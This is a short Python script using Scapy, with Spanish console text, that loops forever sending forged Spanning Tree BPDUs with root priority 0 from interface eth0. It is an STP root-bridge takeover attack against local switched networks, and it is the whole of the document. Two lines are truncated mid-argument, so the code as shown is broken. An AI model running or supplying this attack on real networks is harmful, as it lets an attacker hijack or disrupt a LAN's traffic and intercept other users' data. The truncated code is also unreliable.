from scapy.all import *
import time
 
def stp_attack():
    print("Enviando BPDUs de Prioridad 0...")
    while True:
        pkt = Dot3(src=get_if_hwaddr("eth0"), dst="01:80:c2:00:00:00>
              LLC(dsap=0x42, ssap=0x42, ctrl=0x03) / \
              STP(rootid=0, rootmac=get_if_hwaddr("eth0"), bridgeid=>
        sendp(pkt, iface="eth0", verbose=0)
        time.sleep(2)
 
if __name__ == "__main__":
    stp_attack()
